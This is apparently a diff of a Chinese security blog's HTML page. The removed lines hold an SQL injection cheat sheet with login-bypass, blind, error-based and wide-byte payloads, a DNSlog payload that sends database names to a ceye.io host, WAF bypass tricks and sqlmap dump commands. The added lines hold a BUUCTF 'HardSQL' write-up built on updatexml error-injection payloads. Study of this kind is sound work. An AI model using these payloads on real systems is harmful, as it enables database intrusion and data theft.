@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>sql注入总结 | Wking&#39;s Blog</title>
+  <title>BUUCTF-HardSQL | Wking&#39;s Blog</title>
 
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -593,21 +593,21 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('/medias/11.jpg')">
+  background-position: center center;position: relative;background-image:url('/medias/10.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        sql注入总结
+        BUUCTF-HardSQL
       </span>
     </div>
     
     
       
         <span class="post-detail-header_date">
-          <i class="fas fa-calendar"></i> 发表于：2021-10-27 |
+          <i class="fas fa-calendar"></i> 发表于：2021-11-01 |
         </span>
       
 
@@ -615,8 +615,8 @@
         <span class="post-detail-header_categories">
           <i class="iconfont iconbookmark1"></i> 分类：
           
-            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-detail-header_category">
-              Web安全
+            <a href="/categories/BUUCTF/" class="post-detail-header_category">
+              BUUCTF
             </a>
           
         </span>
@@ -625,11 +625,11 @@
       
         <div class="post-detail-header_wordcount">
           <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> 字数统计: 1.4k |
+            <i class="fas fa-file-text-o"></i> 字数统计: 200 |
           </span>
   
           <span class="min2read">
-            <i class="fas fa-clock"></i> 阅读时长: 6分钟 |
+            <i class="fas fa-clock"></i> 阅读时长: 1分钟 |
           </span>
   
           
@@ -653,114 +653,25 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <h3 id="一、常见注入方式"><a href="#一、常见注入方式" class="headerlink" title="一、常见注入方式"></a>一、常见注入方式</h3><p>万能密码：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1&#39; or &#39;1&#39;&#x3D;&#39;1　　　　　　　　#完整语句 select username,age from userinfo where id&#x3D;&#39;&#39; or &#39;1&#39;&#x3D;&#39;1&#39;
-1&#39; or 1&#x3D;1 #　　　　　　　　　#完整语句 select username,age from userinfo where id&#x3D;&#39;&#39; or 1&#x3D;1#&#39;
-1&#39;&#x3D;0 #　　　　　　　　　　　　#完整语句 select username,age from userinfo where id&#x3D;&#39;&#39;&#x3D;0#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+        <h2 id="知识点：报错注入"><a href="#知识点：报错注入" class="headerlink" title="知识点：报错注入"></a>知识点：报错注入</h2><p>tips：在发现空格，=号，union关键词被强屏蔽了后，可以尝试<strong>报错注入</strong></p>
+<p>绕过技巧可以看sql总结</p>
+<p>这也是头一次尝试用报错注入解题</p>
+<p><code>0x7e</code>就是<code>~</code>,方便观看</p>
+<p>直接上解题步骤：</p>
+<h3 id="1-爆表"><a href="#1-爆表" class="headerlink" title="1.爆表"></a>1.爆表</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span><span class="token number">1</span>'<span class="token operator">or</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span><span class="token punctuation">(</span>table_schema<span class="token punctuation">)</span><span class="token operator">like</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><code>1&#39; order by n</code> 判断字段数，当n回显正常，n+1报错，即n是字段数</p>
-<p><font color='red'>注意事项：</font></p>
-<ul>
-<li>在手工注入时，字符串为表名要加反引号</li>
-</ul>
-<h4 id="1-Union-联合查询"><a href="#1-Union-联合查询" class="headerlink" title="1.Union(联合查询)"></a>1.Union(联合查询)</h4><p>union联合查询，若前者查询失败则会显示后者查询的结果<br>进而利用select 1,2,3,…… 找到可以显示的字段号，例如2,3 即可在2,3位置替换成相应的函数<br>例如<code>database()</code>数据库名称,<code>version()</code>版本</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">查询有哪些表：
-group_concat(&#39;&lt;br&gt;&#39;,table_name) from information_schema.tables where table_schema&#x3D;database()
-查询表中字段：
-group_concat(&#39;&lt;br&gt;&#39;,column_name) from information_schema.columns where table_name&#x3D;&#39;&#39; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2021/11/01/bq1U5zjRFNfoalv.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/11/01/bq1U5zjRFNfoalv.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h3 id="2-爆字段"><a href="#2-爆字段" class="headerlink" title="2.爆字段"></a>2.爆字段</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))),1))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>通过<strong>information_schema</strong>数据库获取信息</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1.查找库名
-select schema_name from information_schema.schemata;
-2.查找表
-select table_name from information_schema.tables where table_schema&#x3D;&#39;AAA&#39;;
-3.查找表中字段
-select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;BBB&#39;;
-4.查找数据
-select username,passwd from BBB;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2021/11/01/V2wEyP9SUaZrmdh.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/11/01/V2wEyP9SUaZrmdh.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h3 id="3-查看字符"><a href="#3-查看字符" class="headerlink" title="3.查看字符"></a>3.查看字符</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(&#96;H4rDsq1&#96;))),1))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h4 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h4><blockquote>
-<p>web页面返回值是布尔型，注入后根据页面返回值来得到数据库信息的方法</p>
-</blockquote>
-<p>1.获取数据库名称的长度<br>    <code>(length(database()))&gt;8 </code>不断的进行判断<br>2.获取数据库名称<br>    <code>(ascii(substr(database(),1,1))=115)</code>第一位 或者 <code>(substr(database(),1,1)=&#39;s&#39;)</code><br>    <code>(ascii(substr(database(),2,1))=115)</code>第二位</p>
-<h4 id="3-时间盲注"><a href="#3-时间盲注" class="headerlink" title="3.时间盲注"></a>3.时间盲注</h4><blockquote>
-<p>根据web页面响应的时间差来判断该页面是否存在SQL注入点（union和布尔盲注用不了时）</p>
-</blockquote>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1.用sleep判断注入点
-	?id&#x3D;1&#39; and sleep(3) --+ 发现3s后网页才刷新，说明语句被带到数据库中执行了
-2.获取数据库名称长度
-	?id&#x3D;1&#39; and if((length(database())&gt;7),sleep(3),1) --+ 不断进行判断
-3.获取数据库名称
-	?id&#x3D;1&#39; and if((ascii(substr(database(),1,1))&gt;101),sleep(3),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现只显示了一半：</p>
+<p><img src="https://i.loli.net/2021/11/01/lAjSBvyNmOtg2f5.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/11/01/lAjSBvyNmOtg2f5.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h3 id="知识点：extractvalue和updatexml只显示32位字符"><a href="#知识点：extractvalue和updatexml只显示32位字符" class="headerlink" title="知识点：extractvalue和updatexml只显示32位字符"></a>知识点：extractvalue和updatexml<code>只显示32位字符</code></h3><p>使用<code>right()</code>显示右边，查看右数20位，对应拼接即可</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,20)))from(&#96;H4rDsq1&#96;))),1))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h4 id="4-报错注入-xpath注入"><a href="#4-报错注入-xpath注入" class="headerlink" title="4.报错注入(xpath注入)"></a>4.报错注入(xpath注入)</h4><blockquote>
-<p>人为地制造报错条件，使查询结果能够出现在错误信息中（要能返回错误信息）</p>
-</blockquote>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#1.updatexml()
-	?id&#x3D;1&#39; and (updatexml(1,concat(0x7e,(select user())),1))#
-#2.extractvalue()
-	?id&#x3D;1&#39; and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="5-DNSlog盲注"><a href="#5-DNSlog盲注" class="headerlink" title="5.DNSlog盲注"></a>5.DNSlog盲注</h4><blockquote>
-<p>利用其他协议或者渠道，http,dns解析等，将数据外带出来，直接回显数据实现注入，可以减少发送的请求</p>
-</blockquote>
-<p>利用条件：mysql.ini中 secure_file_priv 必须为空<br>        为null时，不允许导入导出<br>        为/tmp时，导入导出只能在/tmp目录下<br>payload:<br><code>?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxx.ceye.io\\abc&#39;))--+</code><br>相应更换sql语句，xxx为ceyo.io平台给每个账号起的昵称<br>例如：<br><code>?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.t98xmx.ceye.io\\abc&#39;))--+</code></p>
-<h4 id="6-堆叠注入"><a href="#6-堆叠注入" class="headerlink" title="6.堆叠注入"></a>6.堆叠注入</h4><p>通过<code>;</code> 执行多条sql语句</p>
-<h4 id="7-宽字符注入"><a href="#7-宽字符注入" class="headerlink" title="7.宽字符注入"></a>7.宽字符注入</h4><p>通常过滤 <code>&#39;</code> 的方法是在前面加上转义符：\</p>
-<p>‘的url编码为%27，\的url编码为%5c, 加上%df后</p>
-<p>而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id &#x3D; -1%df&#39; union select ……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<h3 id="二、绕过技巧"><a href="#二、绕过技巧" class="headerlink" title="二、绕过技巧"></a>二、绕过技巧</h3><p>参考博客之一：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Vinson404/p/7253255.html">SQL注入绕过技巧 - VVVinson - 博客园 (cnblogs.com)</a></p>
-<h5 id="1-关键词嵌套、大小写绕过"><a href="#1-关键词嵌套、大小写绕过" class="headerlink" title="1.关键词嵌套、大小写绕过"></a>1.关键词嵌套、大小写绕过</h5><ul>
-<li>union ==&gt; UNIunionO</li>
-</ul>
-<h5 id="2-各种编码"><a href="#2-各种编码" class="headerlink" title="2.各种编码"></a>2.各种编码</h5><ul>
-<li>URL编码 <strong>例如：# 对应的编码为 %23</strong></li>
-<li>16进制编码</li>
-<li>ASCII编码</li>
-<li>Unicode编码</li>
-<li>双重编码</li>
-<li>还有8进制，utf-32，utf-16 等等</li>
-</ul>
-<h5 id="3-关键字替换"><a href="#3-关键字替换" class="headerlink" title="3.关键字替换"></a>3.关键字替换</h5><ul>
-<li>空格替换：/**/, () ,Tab代替空格, 0xa0用16进制解码</li>
-<li>and替换：&amp;&amp;</li>
-<li>or替换：||</li>
-<li>=替换：!&lt;&gt;，like , rlike</li>
-<li>引号替换：用16进制编码</li>
-</ul>
-<h5 id="4-逗号绕过（使用from或者offset）："><a href="#4-逗号绕过（使用from或者offset）：" class="headerlink" title="4.逗号绕过（使用from或者offset）："></a>4.逗号绕过（<strong>使用from或者offset</strong>）：</h5><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。</p>
-<p>对于substr()和mid()这两个方法可以使用<code>from to</code>的方式来解决：</p>
-<pre class="line-numbers language-none"><code class="language-none">select substr(database() from 1 for 1);
-select mid(database() from 1 for 1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>使用join：</p>
-<pre class="line-numbers language-none"><code class="language-none">union select 1,2     #等价于
-union select * from (select 1)a join (select 2)b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p> 使用like：</p>
-<pre class="line-numbers language-none"><code class="language-none">select ascii(mid(user(),1,1))&#x3D;80   #等价于
-select user() like &#39;r%&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>对于<code>limit</code>可以使用<code>offset</code>来绕过：</p>
-<pre class="line-numbers language-none"><code class="language-none">select * from news limit 0,1
-# 等价于下面这条SQL语句
-select * from news limit 1 offset 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<h5 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title=".等价函数绕过"></a>.等价函数绕过</h5><ul>
-<li>hex()、bin()=ascii()</li>
-<li>concat_ws()=group_concat()</li>
-<li>mid()、substr()=substring()</li>
-<li>sleep() ==&gt;benchmark()</li>
-</ul>
-<h3 id="三、sqlmap使用"><a href="#三、sqlmap使用" class="headerlink" title="三、sqlmap使用"></a>三、sqlmap使用</h3><p>详细使用：<a target="_blank" rel="noopener" href="https://www.vuln.cn/2035">sqlmap用户手册详解【实用版】 | 漏洞人生 (vuln.cn)</a></p>
-<p>tamper脚本讲解：<a target="_blank" rel="noopener" href="https://www.vuln.cn/2086">sqlmap注入之tamper绕过WAF防火墙过滤 | 漏洞人生 (vuln.cn)</a></p>
-<p>-u “url”            检测目标网站是否存在注入<br>-u “url” –dbs            获取数据库所有库的名称<br>-u “url” –users        列数据库用户<br>-u “url” –is-dba        判断当前用户是否为数据库管理员权限<br>-u “url” –current-db        获取当前使用的数据库<br>-u “url” –current-user        获取当前用户名称<br>-u “url” -D “xxx” –tables    获取xxx库下的表<br>-u “url” -D “xxx” -T “A,B” –columns     获取A,B表中的字段<br>-u “url” -D “xxx” -T “A” -C “a,b,c” –dump     导出表A中字段a,b,c的数据</p>
-<p>-r xxx.txt            post传入数据进行注入<br>–level                探测等级参数<br>–tamper            使用绕过脚本<br>-u “url” -p “id,username”    指定参数进行扫描<br>设置具体sql注入技术：<br>    –technique B    布尔注入<br>    –technique E    报错注入<br>    –technique U    union查询注入<br>    –technique S    堆叠注入<br>    –technique Q    内联查询注入<br>    –technique T    时间盲注<br>    –technique T –time-sec 3 时间盲注时间为3</p>
-<p>cookie注入：-u “url” –cookie “id=1” –level 2 –dbs<br>UA注入    : -u “url” –level 3 –dbs<br>refer注入 ：-u “url” –level 5 –dbs</p>
+<p><img src="https://i.loli.net/2021/11/01/QbZmfCXhKPOuSwq.png" class="lazyload placeholder" data-srcset="https://i.loli.net/2021/11/01/QbZmfCXhKPOuSwq.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
 
       </div>
       <div class="post-tags-categories">
@@ -782,7 +693,7 @@ select * from news limit 1 offset 0<span aria-hidden="true" class="line-numbers-
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2021/10/27/sql注入总结/" target="_blank" title="sql注入总结">https://Wkingxc.com/2021/10/27/sql注入总结/</a>
+    <a href="/2021/11/01/BUUCTF-HardSQL/" target="_blank" title="BUUCTF-HardSQL">https://Wkingxc.com/2021/11/01/BUUCTF-HardSQL/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -800,49 +711,24 @@ select * from news limit 1 offset 0<span aria-hidden="true" class="line-numbers-
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
-    </div>
-    <a href="/2021/10/28/BUUCTF-EasyCalc/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">BUUCTF-EasyCalc</div>
-      </div>
-      
-      <!-- <div class="content">
-        知识点：PHP字符串解析特性
-
-查看题目和源代码：
-
-
-可以看到一个新页面和设置了WAF
-打开新页面，发现了eval()
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/15.jpg" class="lazyload placeholder" data-srcset="/medias/15.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="/medias/8.jpg" class="lazyload placeholder" data-srcset="/medias/8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
     </div>
-    <a href="/2021/10/26/BUUCTF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="post-nav-link">
+    <a href="/2021/10/30/BUUCTF-EazyMD5/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">BUUCTF-随便注</div>
+        <div class="title-text">BUUCTF-EazyMD5</div>
       </div>
       <!-- <div class="content">
-        简单尝试后，发现是字符型注入，字段为2
-
-尝试使用union注入，发现被过滤，尝试后发现，无法绕过select的过滤
+        打开题目，尝试注入，毫无回显；bp抓包，看到header部分有hint，是一条sql语句
 
 
+知识点：1.关于passw
       </div> -->
     </a>
   </div>
